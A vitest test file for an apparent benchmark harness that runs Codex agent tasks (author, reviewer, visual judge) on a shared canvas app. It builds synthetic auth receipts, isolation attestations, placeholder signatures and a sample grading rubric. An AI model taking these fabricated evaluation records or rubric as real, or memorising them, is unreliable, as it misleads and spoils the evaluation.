// @vitest-environment node

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";

const authPreflightMock = vi.hoisted(() => ({ receipt: null as unknown }));
const provisioningVerificationMock = vi.hoisted(() => ({
  handoff: null as unknown,
  roomReceipt: null as unknown,
}));
vi.mock("../../../research/scripts/codex-auth-preflight.mjs", async (importOriginal) => ({
  ...await importOriginal<Record<string, unknown>>(),
  runCodexAuthPreflight: async () => authPreflightMock.receipt,
}));
vi.mock("./exp0001a-attempt-provisioning", async (importOriginal) => ({
  ...await importOriginal<Record<string, unknown>>(),
  verifyExp0001aAuthorProvisioningHandoff: () => provisioningVerificationMock.handoff,
  verifyExp0001aRoomProvisioningReceipt: () => provisioningVerificationMock.roomReceipt,
}));
vi.mock("./codex-webmcp-spike", async (importOriginal) => {
  const actual = await importOriginal<typeof import("./codex-webmcp-spike")>();
  return {
    ...actual,
    // Spike authority has its own fixed-key suite. These transport tests isolate
    // release behavior while still rejecting missing or blocked gate drafts.
    assertCodexWebMcpAaExecutionAllowed: (gate: unknown, evidence: unknown) => {
      const parsed = gate as { decision?: string; gateDigest?: string; spikeEvidenceDigest?: string } | null;
      if (parsed?.decision !== "allow" || typeof parsed.gateDigest !== "string" || evidence == null) {
        throw new Error("TEST_SPIKE_GATE_REJECTED");
      }
      return parsed;
    },
  };
});
vi.mock("./codex-webmcp-spike-recovery", async (importOriginal) => {
  const actual = await importOriginal<typeof import("./codex-webmcp-spike-recovery")>();
  return {
    ...actual,
    verifyExp0001aCodexSpikeRecoveryGate: (gate: unknown) => {
      const parsed = gate as { decision?: string; gateDigest?: string; evidenceDigest?: string } | null;
      if (parsed?.decision !== "allow" || typeof parsed.gateDigest !== "string"
          || typeof parsed.evidenceDigest !== "string") {
        throw new Error("TEST_SPIKE_GATE_REJECTED");
      }
      return parsed;
    },
  };
});
vi.mock("./exp0001a-codex-authority", async (importOriginal) => {
  const actual = await importOriginal<typeof import("./exp0001a-codex-authority")>();
  return {
    ...actual,
    verifyExp0001aCodexAuthoritySignature: ({ signature }: { signature: unknown }) => signature,
  };
});
vi.mock("./exp0001a-codex-runtime-contract", async (importOriginal) => {
  const actual = await importOriginal<typeof import("./exp0001a-codex-runtime-contract")>();
  return {
    ...actual,
    // Runtime checkpoint/preflight authority is covered by its fixed-key
    // suite. This full scientific-chain test supplies one structurally exact
    // synthetic checkpoint while exercising completion reconstruction.
    verifyExp0001aCodexRuntimePreflight: (receipt: unknown) => receipt,
  };
});

// @ts-expect-error committed ESM auth preflight intentionally has no declaration file
import { createCodexAuthPreflightReceipt } from "../../../research/scripts/codex-auth-preflight.mjs";
import {
  createExp0001aAttemptProvisioningPlan,
  createExp0001aProvisioningCoordinator,
} from "./exp0001a-attempt-provisioning";
import { renderPublicAuthorBrief } from "./benchmark-execution";
import executionManifestJson from "../../../research/data/development-execution-manifest-v1.json";
import reviewPlanManifestJson from "../../../research/data/exp0001a-codex-review-plan-v1.json";
import freezeTemplateJson from "../../../research/data/exp-0001a-codex-prebrief-freeze-v2.json";
import { developmentExecutionManifestSchema } from "./development-manifest";
import {
  CODEX_BROWSER_SKILL_PATH,
  CODEX_WEBMCP_SPIKE_MODEL,
  CODEX_WEBMCP_SPIKE_REASONING,
  computePrivateRoomAccessBinding,
  createCodexWebMcpAaGate,
  sealCodexWebMcpSpikeEvidence,
  type CodexWebMcpSpikeEvidenceContent,
} from "./codex-webmcp-spike";
import {
  EXP0001A_BROWSER_SKILL_DIGEST,
  EXP0001A_BROWSER_SKILL_ID,
  EXP0001A_BROWSER_SKILL_VERSION,
  EXP0001A_CODEX_AUTH_MAX_AGE_MS,
  assertExp0001aCodexTaskContextsSeparated,
  createExp0001aAdjudicationReviewSubject,
  createExp0001aAdjudicatorTaskEnvelope,
  createExp0001aAdjudicatorTaskEnvelopeFromSubject,
  createExp0001aAuthorTaskEnvelopeFromProvisioningHandoff,
  createExp0001aIndependentAuthorArtifact,
  createExp0001aIndependentReviewArtifact,
  createExp0001aPairwiseReviewSubject,
  createExp0001aPairwiseVisualJudgeTaskEnvelope,
  createExp0001aPairwiseVisualJudgeTaskEnvelopeFromSubject,
  createExp0001aPrimaryReviewSubject,
  createExp0001aPrimaryReviewerTaskEnvelope,
  createExp0001aPrimaryReviewerTaskEnvelopeFromSubject,
  evaluateExp0001aCodexTaskTracePolicy,
  exp0001aCodexTaskTransportPlanSchema,
  issueExp0001aCreateReconciliationCommand,
  issueExp0001aAuthorFinalEvidenceCommand,
  issueExp0001aReadThreadCommand,
  issueExp0001aWaitThreadsCommand,
  materializeExp0001aAdjudicationReviewSubjectArtifactPacket,
  materializeExp0001aPairwiseReviewSubjectArtifactPacket,
  prepareExp0001aCodexTaskTransport,
  probeExp0001aCodexArtifactPacket,
  recordExp0001aCreateReconciliationResult,
  recordExp0001aCreateThreadReleaseInvoked,
  recordExp0001aCreateThreadResult,
  recordExp0001aAuthorFinalEvidenceResult,
  recordExp0001aReadThreadResult,
  recordExp0001aWaitThreadsResult,
  renderExp0001aCodexTaskPrompt,
  validateExp0001aCodexTerminalJson,
  type Exp0001aAuthorFinalEvidenceResultInput,
  type Exp0001aCodexArtifactPacketReadyReceipt,
  type Exp0001aCodexTaskEnvelope,
  type Exp0001aCodexTaskLifecycle,
  type Exp0001aCodexTaskTransportPlan,
  type Exp0001aAuthorFinalRoomReadReceipt,
  type Exp0001aReviewEvidenceInput,
} from "./exp0001a-codex-task-transport";
import { canonicalJson, hashCanonicalJson, sha256Digest, type JsonValue } from "./provenance-crypto";
import {
  startExp0001aCodexPairwiseArtifactPacketServer,
  startExp0001aCodexPrimaryArtifactPacketServer,
} from "./exp0001a-codex-artifact-packet-server";
import {
  createExp0001aCodexCoordinatorJournal,
  deriveExp0001aCodexAccountingLedgerFromCoordinatorJournal,
  ingestExp0001aCoordinatorActionResult,
  planNextExp0001aCodexCoordinatorAction,
} from "./exp0001a-codex-coordinator";
import { createExp0001aCodexCompletionAttestation } from "./exp0001a-completion-attestation";
import { finalizeExp0001aCodexTaskAccounting } from "./exp0001a-codex-accounting-finalizer";
import {
  EXP0001A_CODEX_FROZEN_ROLE_SETTINGS,
  EXP0001A_SUBSCRIPTION_PROBE_PROMPT_DIGEST,
  beginExp0001aCodexTask,
  beginNextExp0001aCodexAssignment,
  completeActiveExp0001aCodexAssignment,
  completeExp0001aCodexTask,
  createExp0001aCodexScheduler,
  exp0001aCodexAccountingLedgerSchema,
  exp0001aCodexBalanceReport,
  nextExp0001aCodexAssignment,
  pauseExp0001aCodexSchedulerForUsageLimit,
  resumeExp0001aCodexSchedulerAfterUsageReset,
  terminalizeActiveExp0001aCodexAssignment,
  terminateExp0001aCodexTask,
  type Exp0001aCodexTaskAccounting,
} from "./exp0001a-codex-accounting";
import {
  computeExp0001aCodexPrebriefFreezeDigest,
  verifyExp0001aCodexPrebriefFreeze,
} from "./exp0001a-codex-prebrief-freeze";
import {
  createExp0001aCodexScientificState,
  performExp0001aCodexScientificTransition,
} from "./exp0001a-codex-scientific-runtime";
import { exp0001aCodexReviewPlanManifestSchema } from "./exp0001a-codex-review-runtime";

const START = "2026-08-30T20:00:00.000Z";
const PREPARED = "2026-08-30T20:02:00.000Z";
const RELEASED = "2026-08-30T20:02:01.000Z";
const ROOM_ID = "room_12345678-abcd-4321-9876-1234567890ab";
const INVITE_URL = "https://www.jazzboard.xyz/#join=ABC234";
const temporaryRoots: string[] = [];

beforeEach(() => {
  vi.useFakeTimers();
  vi.setSystemTime(RELEASED);
  authPreflightMock.receipt = chatGptAuth(RELEASED);
});
afterEach(() => {
  vi.unstubAllGlobals();
  vi.useRealTimers();
});
afterEach(async () => {
  await Promise.all(temporaryRoots.splice(0).map((root) => rm(root, { recursive: true, force: true })));
});

function digest(label: string): `sha256:${string}` {
  return hashCanonicalJson({ label }) as `sha256:${string}`;
}

function syntheticTimeline(index: number) {
  const base = Date.parse("2026-08-30T20:02:01.000Z") + index * 60_000;
  const at = (milliseconds: number) => new Date(base + milliseconds).toISOString();
  return Object.freeze({
    releasedAt: at(0),
    createObservedAt: at(1_000),
    waitIssuedAt: at(2_000),
    terminalCompletedAt: at(2_500),
    waitObservedAt: at(3_000),
    evidenceIssuedAt: at(3_250),
    evidenceObservedAt: at(3_750),
    readIssuedAt: at(4_000),
    readObservedAt: at(5_000),
  });
}

function syntheticCodexFreeze() {
  const retained = structuredClone(freezeTemplateJson);
  const { freezeDigest: _staleDigest, ...content } = retained;
  void _staleDigest;
  content.passedSpikeGate.authoritySignaturePayloadDigest = digest("synthetic-v2-spike-gate-authority-payload");
  content.passedSpikeGate.gateDigest = digest("synthetic-v2-spike-gate");
  content.passedSpikeGate.spikeEvidenceDigest = digest("synthetic-v2-spike-evidence");
  content.passedSpikeGate.authoritySignatureBase64 = Buffer.alloc(64, 7).toString("base64");
  return verifyExp0001aCodexPrebriefFreeze({
    ...content,
    freezeDigest: computeExp0001aCodexPrebriefFreezeDigest(
      content as Parameters<typeof computeExp0001aCodexPrebriefFreezeDigest>[0],
    ),
  });
}

function artifact(label: string, mimeType = "application/json") {
  return { sha256: digest(label), bytes: label.length + 100, mimeType };
}

function codexAppResult(payload: unknown, isError = false) {
  return {
    content: [{ type: "text", text: canonicalJson(payload) }],
    isError,
  };
}

function resumeAfterNeutralProbe(
  scheduler: ReturnType<typeof createExp0001aCodexScheduler>,
  label: string,
) {
  const pause = scheduler.pause;
  if (pause === null) throw new Error("synthetic scheduler is not paused");
  const probeBegunAt = "2026-08-30T20:02:03.000Z";
  const probeCompletedAt = "2026-08-30T20:02:04.000Z";
  const probeTerminalAt = "2026-08-30T20:02:05.000Z";
  let probe = beginExp0001aCodexTask({
    accountingId: `accounting-probe-${label}`,
    assignmentId: `assignment-probe-${label}`,
    attemptId: `attempt-probe-${label}`,
    role: "subscription_probe",
    codexTaskId: `task-probe-${label}`,
    threadId: `task-probe-${label}`,
    hostId: "local",
    isolation: {
      workspace: "projectless",
      repositoryAccess: false,
      privateApiAccess: false,
      sharedHistory: false,
      forkedFromAnotherTask: false,
      preparedCoordinates: false,
      evaluatorContext: false,
    },
    requestedModel: EXP0001A_CODEX_FROZEN_ROLE_SETTINGS.subscription_probe.requestedModel,
    requestedReasoningEffort: EXP0001A_CODEX_FROZEN_ROLE_SETTINGS.subscription_probe.requestedReasoningEffort,
    begunAt: probeBegunAt,
  });
  probe = completeExp0001aCodexTask(probe, probeCompletedAt);
  probe = terminateExp0001aCodexTask(probe, {
    terminalAt: probeTerminalAt,
    outcome: "succeeded",
    reasonCode: "availability_probe_succeeded",
  });
  const payload = {
    schemaVersion: "exp-0001a-chatgpt-usage-reset-observation/v1" as const,
    kind: "chatgpt-usage-reset-observation" as const,
    observationId: `usage-reset-${label}`,
    observedAt: "2026-08-30T20:02:06.000Z",
    resumedAt: "2026-08-30T20:02:07.000Z",
    priorUsageWindow: scheduler.currentUsageWindow,
    nextUsageWindow: scheduler.currentUsageWindow + 1,
    source: "codex_app_host" as const,
    resetState: "availability_probe_succeeded" as const,
    priorInterruptionDigest: pause.evidenceDigest,
    subscriptionUsageBefore: "unobservable" as const,
    subscriptionUsageAfter: "unobservable" as const,
    probe: {
      role: "subscription_probe" as const,
      neutralPromptDigest: EXP0001A_SUBSCRIPTION_PROBE_PROMPT_DIGEST,
      benchmarkContentIncluded: false as const,
      accountingId: probe.accountingId,
      accountingRecordDigest: hashCanonicalJson(probe),
      codexTaskId: probe.codexTaskId,
      threadId: probe.threadId,
      hostId: probe.hostId as string,
      createThreadRawOutputDigest: digest(`probe-create-${label}`),
      terminalRawOutputDigest: digest(`probe-terminal-${label}`),
    },
  };
  return resumeExp0001aCodexSchedulerAfterUsageReset(scheduler, {
    observation: {
      ...payload,
      authoritySignature: {
        schemaVersion: "exp-0001a-codex-authority-signature/v1",
        protocolId: "EXP-0001A",
        kind: "codex-authority-signature",
        algorithm: "Ed25519",
        keyId: "exp0001a-launch-authority-2026-08-30",
        publicKeyDigest: "sha256:6fdb285e74644254c72c0e58b098bb1f7d9f8091dc861f830750e89464e503de",
        signedAt: "2026-08-30T20:02:06.500Z",
        purpose: "usage_reset_probe",
        payloadDigest: hashCanonicalJson(payload),
        signatureBase64: Buffer.alloc(64, 3).toString("base64"),
      },
    },
    probeAccounting: probe,
  });
}

function terminalTextDigest(value: JsonValue): string {
  return sha256Digest(Buffer.from(canonicalJson(value), "utf8"));
}

function passingSpike() {
  const artifacts = {
    authPreflight: artifact("auth"),
    promptEnvelope: artifact("prompt"),
    taskCreationReceipt: artifact("task"),
    roomCreationReceipt: artifact("room"),
    platformBootstrapTrace: artifact("bootstrap", "application/x-ndjson"),
    isolationAttestation: artifact("isolation"),
    webMcpTrace: artifact("trace", "application/x-ndjson"),
    terminalResult: artifact("terminal", "text/plain"),
    semanticState: artifact("state"),
    canvasImage: artifact("png", "image/png") as ReturnType<typeof artifact> & { mimeType: "image/png" },
  };
  const artifactSetRoot = hashCanonicalJson({
    schemaVersion: 1,
    artifacts: Object.entries(artifacts).sort(([left], [right]) => left.localeCompare(right))
      .map(([name, reference]) => ({ name, ...reference })),
  });
  const toolNames = ["create_shape", "inspect_canvas", "join_room", "read_room_state"];
  const content: Extract<CodexWebMcpSpikeEvidenceContent, { status: "pass" }> = {
    schemaVersion: 1,
    kind: "codex-webmcp-disposable-spike-evidence",
    spikeId: "spike-transport-fixture",
    status: "pass",
    startedAt: START,
    completedAt: "2026-08-30T20:01:00.000Z",
    wallTimeMs: 60_000,
    failureReasons: [],
    auth: { method: "chatgpt", observedAt: START, preflightReceiptDigest: artifacts.authPreflight.sha256 },
    promptEnvelopeDigest: artifacts.promptEnvelope.sha256,
    task: {
      taskId: "codex-spike-task-unique",
      hostId: "local",
      createdAt: START,
      creationReceiptDigest: artifacts.taskCreationReceipt.sha256,
      creationMode: "fresh_projectless_task",
      workspaceKind: "projectless",
      projectId: null,
      sourceTaskId: null,
      forkedFromTaskId: null,
      sharedHistory: false,
      requestedModel: { id: CODEX_WEBMCP_SPIKE_MODEL, reasoningEffort: CODEX_WEBMCP_SPIKE_REASONING, settingsFrozen: true },
      observedModel: { id: "unobservable", reasoningEffort: "unobservable" },
    },
    room: {
      roomId: ROOM_ID,
      privateRoomUrl: INVITE_URL,
      accessMode: "invite",
      privateAccessBindingDigest: computePrivateRoomAccessBinding({ privateRoomUrl: INVITE_URL, roomId: ROOM_ID }),
      createdAt: "unobservable",
      creationReceiptDigest: artifacts.roomCreationReceipt.sha256,
      creationMode: "fresh_private_room",
      visibility: "private",
    },
    platformBootstrap: {
      observed: true,
      at: "unobservable",
      operation: "read_installed_browser_skill",
      skillPath: CODEX_BROWSER_SKILL_PATH,
      skillFileDigest: digest("skill"),
      traceArtifactDigest: artifacts.platformBootstrapTrace.sha256,
      workingDirectoryKind: "empty_projectless_workspace",
      commandExecutionCount: 1,
      filesystemReadCount: 1,
      filesystemWriteCount: 0,
      projectOrRepositoryReadCount: 0,
      otherCommandExecutionCount: 0,
      directHttpRequestCount: 0,
    },
    isolation: {
      repositoryAccess: "absent",
      privateApiAccess: "absent",
      openAiApiKeyAvailable: false,
      directProviderApiRequestCount: 0,
      directHttpRequestCount: 0,
      filesystemProjectContext: "empty_projectless_workspace",
      attestationDigest: artifacts.isolationAttestation.sha256,
    },
    webMcp: {
      surface: "browser-exposed",
      discoveredAt: "unobservable",
      toolNames,
      inventoryDigest: hashCanonicalJson({ surface: "browser-exposed", toolNames }),
      calls: [
        { sequence: 0, at: "unobservable", toolName: "join_room", kind: "lifecycle", status: "succeeded", argumentsDigest: digest("ja"), resultDigest: digest("jr"), failureCode: null, authoritativeRoomRevision: 0 },
        { sequence: 1, at: "unobservable", toolName: "read_room_state", kind: "read", status: "succeeded", argumentsDigest: digest("ra"), resultDigest: digest("rr"), failureCode: null, authoritativeRoomRevision: 0 },
        { sequence: 2, at: "unobservable", toolName: "create_shape", kind: "mutation", status: "succeeded", argumentsDigest: digest("ca"), resultDigest: digest("cr"), failureCode: null, authoritativeRoomRevision: 1 },
        { sequence: 3, at: "unobservable", toolName: "inspect_canvas", kind: "inspection", status: "succeeded", argumentsDigest: digest("ia"), resultDigest: digest("ir"), failureCode: null, authoritativeRoomRevision: 1 },
        { sequence: 4, at: "unobservable", toolName: "read_room_state", kind: "read", status: "succeeded", argumentsDigest: digest("fa"), resultDigest: digest("fr"), failureCode: null, authoritativeRoomRevision: 1 },
      ],
      traceArtifactDigest: artifacts.webMcpTrace.sha256,
    },
    terminal: { status: "completed", completedAt: "2026-08-30T20:01:00.000Z", resultDigest: artifacts.terminalResult.sha256 },
    authoritativeCanvas: {
      finalRoomRevision: 1,
      objectCount: 1,
      revisionObservations: [
        { sequence: 0, at: "unobservable", roomRevision: 0, sourceToolCallSequence: 1, semanticStateDigest: null, final: false },
        { sequence: 1, at: "unobservable", roomRevision: 1, sourceToolCallSequence: 4, semanticStateDigest: artifacts.semanticState.sha256, final: true },
      ],
      objectRevisions: [{ semanticObjectId: "shape-one", revision: 1 }],
      semanticStateDigest: artifacts.semanticState.sha256,
      canvasImageDigest: artifacts.canvasImage.sha256,
    },
    artifacts,
    artifactSetRoot,
  };
  const evidence = sealCodexWebMcpSpikeEvidence(content);
  const legacyGate = createCodexWebMcpAaGate({ evaluatedAt: "2026-08-30T20:01:01.000Z", spikeEvidence: evidence });
  const gate = { ...legacyGate, evidenceDigest: hashCanonicalJson(evidence) };
  return { evidence, gate };
}

function chatGptAuth(checkedAt = PREPARED) {
  return createCodexAuthPreflightReceipt({
    stdout: "Logged in using ChatGPT\n",
    stderr: "",
    exitCode: 0,
    signal: null,
    invocationError: false,
    outputLimitExceeded: false,
  }, { checkedAt });
}

function authorEnvelope(authorReleaseAt = "2026-08-30T20:01:59.000Z", plannedIndex = 0) {
  const plan = createExp0001aAttemptProvisioningPlan();
  const attempt = plan.attempts[plannedIndex]!;
  if (!attempt) throw new Error(`missing synthetic attempt ${plannedIndex}`);
  const roomId = plannedIndex === 0
    ? ROOM_ID
    : `room_12345678-abcd-4321-9876-${String(plannedIndex).padStart(12, "0")}`;
  const inviteAlphabet = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  const inviteUrl = plannedIndex === 0
    ? INVITE_URL
    : `https://www.jazzboard.xyz/#join=AAAA${inviteAlphabet[Math.floor(plannedIndex / inviteAlphabet.length)]}${inviteAlphabet[plannedIndex % inviteAlphabet.length]}`;
  const accessBinding = computePrivateRoomAccessBinding({ privateRoomUrl: inviteUrl, roomId });
  const handoffContent = {
    schemaVersion: "exp-0001a-author-provisioning-handoff/v1" as const,
    kind: "exp-0001a-author-provisioning-handoff" as const,
    trustedBinding: {
      assignmentId: attempt.assignmentId,
      attemptId: attempt.attemptId,
      plannedIndex: attempt.plannedIndex,
      planDigest: plan.planDigest,
      attemptPlanDigest: attempt.attemptPlanDigest,
      roomReceiptDigest: digest(`room-provisioning-${plannedIndex}`),
      roomId,
      roomAccessBindingDigest: accessBinding,
      publicAuthorPacketDigest: attempt.publicAuthorPacketDigest,
      authorReleaseAt,
      coordinatorPresenceExpiredBeforeRelease: true as const,
    },
    authorVisible: {
      publicTaskPacket: attempt.publicAuthorPacket,
      renderedPublicBrief: renderPublicAuthorBrief(attempt.publicAuthorPacket),
      privateRoomInviteUrl: inviteUrl,
    },
  };
  const handoff = { ...handoffContent, handoffDigest: hashCanonicalJson(handoffContent) };
  const roomReceipt = {
    receiptDigest: handoff.trustedBinding.roomReceiptDigest,
    assignmentId: attempt.assignmentId,
    attemptId: attempt.attemptId,
    plannedIndex: attempt.plannedIndex,
    planDigest: plan.planDigest,
    attemptPlanDigest: attempt.attemptPlanDigest,
    room: { roomId, inviteUrl, accessBindingDigest: accessBinding },
    coordinatorPresence: { authorReleaseNotBefore: authorReleaseAt },
  };
  provisioningVerificationMock.handoff = handoff;
  provisioningVerificationMock.roomReceipt = roomReceipt;
  return createExp0001aAuthorTaskEnvelopeFromProvisioningHandoff(handoff, roomReceipt);
}

async function reviewInput(origin: string, suffix = "unique"): Promise<Exp0001aReviewEvidenceInput> {
  const authorPlan = prepare(authorEnvelope(), null, { transportId: `transport-author-review-${suffix}` });
  const { lifecycle: authorRunning } = await begin(authorPlan, `thread-review-evidence-author-${suffix}`);
  const terminalJson = {
    schemaVersion: "jazzboard-canvas-terminal-result/v1" as const,
    actor: "canvas_worker" as const,
    status: "completed" as const,
    artifactSummary: "Created and inspected a service flow.",
    finalAuthoritativeRead: { roomRevision: 4, objectCount: 5 },
    webMcpToolsUsed: [
      "get_canvas_capabilities",
      "read_room_state",
      "apply_canvas_transaction",
      "inspect_canvas_scope",
      "export_canvas_png",
    ],
  };
  const terminalResultDigest = terminalTextDigest(terminalJson);
  const awaitingRead = completeWait(authorRunning, terminalJson);
  const command = issueExp0001aReadThreadCommand({ lifecycle: awaitingRead, issuedAt: "2026-08-30T20:02:06.000Z" });
  const authorLifecycle = recordExp0001aReadThreadResult({
    plan: authorPlan,
    lifecycle: awaitingRead,
    command,
    observedAt: "2026-08-30T20:02:07.000Z",
    rawResult: rawReadThreadPage(authorPlan, awaitingRead, terminalJson),
    finalAuthoritativeEvidenceReceipt: finalRoomReadReceipt(authorPlan, awaitingRead),
  });
  return {
    publicRequirement: "Create a readable service flow with labels, connectors, and clear visual hierarchy.",
    rubric: {
      rubricId: "service-flow-rubric",
      criterionIds: ["semantic-completeness", "visual-readability"],
      allowedMechanismTags: ["layout", "connector-routing"],
      content: {
        criteria: [
          { id: "semantic-completeness", requirement: "All services and relationships are present." },
          { id: "visual-readability", requirement: "Labels and connectors are readable." },
        ],
      },
    },
    authorPlan,
    authorLifecycle,
    artifactPacketOrigin: origin,
  };
}

async function failedAuthorReviewInput(origin: string, suffix: string): Promise<Exp0001aReviewEvidenceInput> {
  const successful = await reviewInput(origin, `${suffix}-rubric-source`);
  const authorPlan = prepare(authorEnvelope(), null, { transportId: `transport-author-failed-${suffix}` });
  const { lifecycle: running } = await begin(authorPlan, `thread-author-failed-${suffix}`);
  const invalidTerminal = { schemaVersion: "invalid-author-terminal/v1", status: "failed" } as const;
  const awaitingRead = completeWait(running, invalidTerminal);
  const command = issueExp0001aReadThreadCommand({ lifecycle: awaitingRead, issuedAt: "2026-08-30T20:02:06.000Z" });
  const authorLifecycle = recordExp0001aReadThreadResult({
    plan: authorPlan,
    lifecycle: awaitingRead,
    command,
    observedAt: "2026-08-30T20:02:07.000Z",
    rawResult: rawReadThreadPage(authorPlan, awaitingRead, invalidTerminal),
    finalAuthoritativeEvidenceReceipt: null,
  });
  expect(authorLifecycle).toMatchObject({ state: "terminal", terminalOutcome: "non_evaluable" });
  return {
    publicRequirement: successful.publicRequirement,
    rubric: successful.rubric,
    authorPlan,
    authorLifecycle,
    artifactPacketOrigin: origin,
  };
}

function installPacketFetch(envelope: Exclude<Exp0001aCodexTaskEnvelope, { role: "author" }>, options: {
  acceptWrites?: boolean;
  corruptFiles?: boolean;
} = {}) {
  const packet = envelope.artifactPacket;
  const retainedFinalPng = Buffer.from(ONE_PIXEL_PNG_BASE64, "base64");
  const bodies = new Map(packet.files.map((file) => [
    file.relativePath,
    {
      bytes: file.sha256 === sha256Digest(retainedFinalPng)
        ? retainedFinalPng
        : Buffer.from(canonicalJson(
        envelope.kind === "primary-reviewer-author-failure-task-envelope"
          ? envelope.authorFailurePacket
          : envelope.kind === "pairwise-visual-unavailable-task-envelope"
            ? envelope.unavailablePacket
            : {},
        ), "utf8"),
      mimeType: file.mimeType,
    },
  ]));
  const manifest = JSON.stringify({ schemaVersion: 1, kind: "canvas-review-evidence-packet/v1", files: packet.files });
  const rootPath = new URL("./", packet.manifestUrl).pathname;
  vi.stubGlobal("fetch", async (input: string | URL | Request, init?: RequestInit) => {
    const href = typeof input === "string" ? input : input instanceof URL ? input.href : input.url;
    const url = new URL(href, packet.origin);
    const method = init?.method ?? "GET";
    if (["POST", "PUT", "DELETE"].includes(method) && options.acceptWrites) {
      return new Response(null, { status: 204 });
    }
    if (["POST", "PUT", "DELETE"].includes(method)) {
      return new Response(null, { status: 405 });
    }
    if (url.pathname === new URL(packet.manifestUrl).pathname) {
      return new Response(method === "HEAD" ? null : manifest, {
        status: 200,
        headers: { "content-type": "application/json", "content-length": String(Buffer.byteLength(manifest)) },
      });
    }
    if (url.pathname === rootPath) {
      return new Response(null, { status: 404 });
    }
    const relativePath = decodeURIComponent(url.pathname.slice(rootPath.length));
    const body = bodies.get(relativePath);
    if (body !== undefined) {
      const served = options.corruptFiles ? Buffer.from("corrupt") : body.bytes;
      return new Response(served, {
        status: 200,
        headers: { "content-type": body.mimeType, "content-length": String(served.byteLength) },
      });
    }
    return new Response(null, { status: 404 });
  });
}

let nextOriginPort = 18_765;
function availableOrigin(): string {
  return `http://127.0.0.1:${nextOriginPort++}/`;
}

async function packetReceipt(envelope: Exclude<Exp0001aCodexTaskEnvelope, { role: "author" }>) {
  installPacketFetch(envelope);
  return probeExp0001aCodexArtifactPacket({ envelope, now: () => "2026-08-30T20:01:59.000Z" });
}

function prepare(
  envelope: Exp0001aCodexTaskEnvelope,
  receipt: Exp0001aCodexArtifactPacketReadyReceipt | null = null,
  overrides: Partial<Parameters<typeof prepareExp0001aCodexTaskTransport>[0]> = {},
) {
  const spike = passingSpike();
  return prepareExp0001aCodexTaskTransport({
    transportId: `transport-${envelope.role.replaceAll("_", "-")}-unique`,
    preparedAt: PREPARED,
    assignmentId: envelope.role === "author"
      ? envelope.provisioningBinding.assignmentId
      : `assignment-${envelope.role.replaceAll("_", "-")}-private`,
    attemptId: envelope.role === "author"
      ? envelope.provisioningBinding.attemptId
      : `attempt-${envelope.role.replaceAll("_", "-")}-private`,
    subjectArtifactIds: envelope.role === "author" ? [] : envelope.role === "pairwise_visual_judge" ? ["artifact-one", "artifact-two"] : ["artifact-one"],
    envelope,
    ...(envelope.role === "author" ? {
      authorProvisioning: {
        handoff: provisioningVerificationMock.handoff,
        roomProvisioningReceipt: provisioningVerificationMock.roomReceipt,
      },
    } : {}),
    artifactPacketReadyReceipt: receipt,
    authPreflightReceipt: chatGptAuth(),
    spikeGate: spike.gate,
    spikeEvidence: spike.evidence,
    ...overrides,
  });
}

async function begin(
  plan: Exp0001aCodexTaskTransportPlan,
  threadId = `thread-${plan.role}-unique`,
  timing: Readonly<{ releasedAt: string; createObservedAt: string }> = {
    releasedAt: RELEASED,
    createObservedAt: "2026-08-30T20:02:02.000Z",
  },
) {
  vi.setSystemTime(timing.releasedAt);
  authPreflightMock.receipt = chatGptAuth(timing.releasedAt);
  const release = await recordExp0001aCreateThreadReleaseInvoked({
    plan,
    journalEvidenceDigest: digest(`journal-${plan.role}`),
  });
  const lifecycle = recordExp0001aCreateThreadResult({
    plan,
    releaseInvocationReceipt: release,
    observedAt: timing.createObservedAt,
    rawResult: codexAppResult({ threadId, hostId: "local" }),
  });
  return { release, lifecycle };
}

function completeWait(
  lifecycle: Exp0001aCodexTaskLifecycle,
  terminalJson: JsonValue,
  timing: Readonly<{ waitIssuedAt: string; terminalCompletedAt: string; waitObservedAt: string }> = {
    waitIssuedAt: "2026-08-30T20:02:03.000Z",
    terminalCompletedAt: "2026-08-30T20:02:03.500Z",
    waitObservedAt: "2026-08-30T20:02:04.000Z",
  },
) {
  const command = issueExp0001aWaitThreadsCommand({ lifecycle, issuedAt: timing.waitIssuedAt });
  return recordExp0001aWaitThreadsResult({
    lifecycle,
    command,
    observedAt: timing.waitObservedAt,
    rawResult: codexAppResult({
      timedOut: false,
      wake: {
        reason: "turnCompleted",
        turnId: "turn-terminal",
        threadId: lifecycle.threadId!,
        hostId: lifecycle.hostId!,
      },
      polls: [{
        schemaVersion: 1,
        cursor: `cursor-${lifecycle.codexTaskId}`,
        revision: 1,
        changed: true,
        thread: { id: lifecycle.threadId!, hostId: lifecycle.hostId!, status: { type: "idle" } },
        latestTurn: {
          id: "turn-terminal",
          status: "completed",
          error: null,
          startedAt: Date.parse(timing.waitIssuedAt) / 1_000,
          completedAt: Date.parse(timing.terminalCompletedAt) / 1_000,
          durationMs: 500,
        },
        latestAssistantMessageId: "message-terminal",
        latestAssistantMessage: {
          id: "message-terminal",
          turnId: "turn-terminal",
          phase: "final_answer",
          text: canonicalJson(terminalJson),
        },
        latestToolMarkerId: null,
        latestToolMarker: null,
      }],
    }),
  });
}

function rawReadThreadPage(
  plan: Exp0001aCodexTaskTransportPlan,
  lifecycle: Exp0001aCodexTaskLifecycle,
  terminalJson: JsonValue,
  options: {
    hasMore?: boolean;
    nextCursor?: string;
    truncated?: boolean;
    includeTrace?: boolean;
    includeFinal?: boolean;
    openPacketFiles?: boolean;
    extraTraceCode?: string;
    nodeStatus?: "completed" | "failed";
  } = {},
) {
  const text = canonicalJson(terminalJson);
  const hasMore = options.hasMore ?? false;
  const packet = plan.envelope.role === "author" ? null : plan.envelope.artifactPacket;
  const targetUrl = packet === null ? "https://www.jazzboard.xyz" : packet.origin;
  const navigationUrl = plan.envelope.role === "author" ? plan.envelope.privateRoomUrl : packet!.manifestUrl;
  const packetFileNavigationCode = packet === null || options.openPacketFiles === false ? "" : packet.files
    .map((file) => `await tab.goto('${new URL(file.relativePath, new URL("./", packet.manifestUrl)).href}');`)
    .join("\n");
  const webMcpCode = plan.envelope.role === "author"
    ? [
      "const webmcp = await tab.capabilities.get('webmcp');",
      "const tools = await webmcp.fetchTools();",
      "const capabilityResult = await tools.call('get_canvas_capabilities', {}); if (!capabilityResult.ok) throw new Error('capability failed');",
      "const initialReadResult = await tools.call('read_room_state', {}); if (!initialReadResult.ok) throw new Error('read failed');",
